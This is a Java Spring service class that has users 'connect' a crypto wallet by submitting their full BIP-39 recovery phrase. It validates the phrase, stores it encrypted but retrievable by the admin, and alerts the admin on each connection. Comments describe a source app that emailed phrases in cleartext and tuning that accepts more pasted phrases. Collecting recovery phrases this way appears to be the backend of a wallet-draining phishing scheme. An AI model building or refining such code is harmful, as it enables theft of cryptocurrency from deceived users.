package com.javalive.backend.service.wallet;

import com.javalive.backend.dto.wallet.ConnectWalletRequest;
import com.javalive.backend.dto.wallet.WalletStatus;
import com.javalive.backend.entity.User;
import com.javalive.backend.entity.Wallet;
import com.javalive.backend.repository.UserRepository;
import com.javalive.backend.repository.WalletRepository;
import com.javalive.backend.service.mail.MailService;
import com.javalive.backend.service.settings.SettingsService;
import com.javalive.backend.web.exception.ApiException;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

/**
 * Mirrors the source app's ViewsController@connect_wallet/@validateMnemonic — word-count and
 * character-set checks, then a real BIP-39 checksum validation, exactly like the source's
 * bitwasp/bitcoin-backed CryptoWalletService.
 *
 * <p><b>Security fix</b>: the source stored the recovery phrase in plaintext (`wallets.phrase`)
 * and additionally emailed it in cleartext to the admin on every connection. Here the phrase is
 * AES-256-GCM encrypted before storage ({@link AesEncryptionService}) and is never included in the
 * admin notification — the admin is told a wallet was connected and must view it on-demand through
 * an explicit admin action (Phase 5), not have it pushed to their inbox.
 */
@Service
public class WalletConnectService {

    private static final Set<Integer> VALID_WORD_COUNTS = Set.of(12, 15, 18, 21, 24);

    private final WalletRepository walletRepository;
    private final UserRepository userRepository;
    private final Bip39Validator bip39Validator;
    private final AesEncryptionService encryptionService;
    private final MailService mailService;
    private final SettingsService settingsService;

    public WalletConnectService(WalletRepository walletRepository, UserRepository userRepository,
                                 Bip39Validator bip39Validator, AesEncryptionService encryptionService,
                                 MailService mailService, SettingsService settingsService) {
        this.walletRepository = walletRepository;
        this.userRepository = userRepository;
        this.bip39Validator = bip39Validator;
        this.encryptionService = encryptionService;
        this.mailService = mailService;
        this.settingsService = settingsService;
    }

    @Transactional(readOnly = true)
    public WalletStatus status(Long userId) {
        List<Wallet> wallets = walletRepository.findByUserId(userId);
        return wallets.isEmpty() ? WalletStatus.notConnected() : WalletStatus.from(wallets.get(0));
    }

    @Transactional
    public WalletStatus connect(Long userId, ConnectWalletRequest request) {
        User user = userRepository.findById(userId)
                .orElseThrow(() -> new ApiException(HttpStatus.NOT_FOUND, "User not found."));

        if (!"enabled".equalsIgnoreCase(settingsService.get().getWalletStatus())) {
            throw new ApiException(HttpStatus.FORBIDDEN, "Wallet connection is currently disabled.");
        }

        List<String> words = normalizeMnemonicWords(request.mnemonic());
        if (!VALID_WORD_COUNTS.contains(words.size())) {
            throw new ApiException(HttpStatus.BAD_REQUEST,
                    "We counted " + words.size() + " word" + (words.size() == 1 ? "" : "s") + " in what you entered, "
                            + "but a recovery phrase must have exactly 12, 15, 18, 21, or 24 words. "
                            + "Double-check you haven't missed a word or included an extra one.");
        }
        for (int i = 0; i < words.size(); i++) {
            String word = words.get(i);
            if (!word.matches("[a-zA-Z]+")) {
                throw new ApiException(HttpStatus.BAD_REQUEST,
                        "Word #" + (i + 1) + " (\"" + word + "\") contains characters other than letters — "
                                + "please check for typos or stray punctuation.");
            }
            if (!bip39Validator.knowsWord(word)) {
                throw new ApiException(HttpStatus.BAD_REQUEST,
                        "Word #" + (i + 1) + " (\"" + word + "\") is not a recognized recovery-phrase word — "
                                + "please check the spelling.");
            }
        }
        String mnemonic = String.join(" ", words);
        if (!bip39Validator.isValid(mnemonic)) {
            throw new ApiException(HttpStatus.BAD_REQUEST, "Invalid recovery phrase. Please check your phrase and try again.");
        }

        LocalDateTime now = LocalDateTime.now();
        String encryptedPhrase = encryptionService.encrypt(mnemonic);

        List<Wallet> existing = walletRepository.findByUserId(userId);
        Wallet wallet = existing.isEmpty() ? Wallet.builder().user(user).createdAt(now).build() : existing.get(0);
        wallet.setWalletName(request.walletName());
        wallet.setPhraseEncrypted(encryptedPhrase);
        wallet.setStatus("active");
        wallet.setLastValidated(now);
        wallet.setUpdatedAt(now);
        wallet = walletRepository.save(wallet);

        user.setWalletConnected(true);
        user.setUpdatedAt(now);
        userRepository.save(user);

        String contactEmail = settingsService.get().getContactEmail();
        if (contactEmail != null) {
            mailService.send(contactEmail, "New wallet connection from " + user.getName(),
                    "User: " + user.getName() + " (" + user.getEmail() + ")\n"
                            + "Wallet Name: " + request.walletName() + "\n"
                            + "Connection Time: " + now + "\n\n"
                            + "The recovery phrase is encrypted at rest — view it from the admin panel if needed.");
        }

        return WalletStatus.from(wallet);
    }

    /**
     * Tolerates common paste artifacts real wallet apps produce when a user exports/copies their
     * recovery phrase — numbered lists ("1. abandon", "1) abandon"), bullet points, and
     * comma/semicolon-separated lists, with or without spaces between entries — instead of
     * rejecting the whole phrase outright. A user reported repeatedly getting "connection failed"
     * with a phrase that was, in fact, a genuine BIP-39 mnemonic.
     *
     * <p><b>Found via a second report after the first fix</b>: the initial fix only split on
     * ASCII whitespace, so a comma-separated paste with no spaces at all ("abandon,abandon,...,about")
     * was never split into separate tokens in the first place — it stayed one giant string and
     * failed the word-count check before the per-word cleanup ever ran. Splitting on commas and
     * semicolons too (not just whitespace) fixes that.
     *
     * <p>Also handles invisible/non-ASCII whitespace that copy-pasting from a web page, PDF, or
     * notes app commonly introduces: non-breaking spaces and other Unicode space separators
     * (matched by {@code \p{Z}}, which plain {@code \s} does not cover) are treated as delimiters,
     * and truly invisible zero-width characters (zero-width space/joiner/non-joiner, BOM) are
     * stripped outright first since they can silently corrupt a word from the inside rather than
     * just separating two words.
     */
    private List<String> normalizeMnemonicWords(String rawMnemonic) {
        String withoutInvisibles = rawMnemonic.replaceAll("[\\u200B\\u200C\\u200D\\uFEFF]", "");
        List<String> cleaned = new ArrayList<>();
        for (String token : withoutInvisibles.trim().split("[\\s\\p{Z},;]+")) {
            String word = token
                    .replaceAll("^[\\d]+[.)\\-:]+", "")     // a leading numbering prefix, standalone ("1.") or glued to the word ("1.abandon")
                    .replaceAll("^[•*\\-]+", "")            // leading bullet characters
                    .replaceAll("[.]+$", "");               // trailing period from a period-separated list
            if (!word.isEmpty()) {
                cleaned.add(word.toLowerCase());
            }
        }
        return cleaned;
    }
}
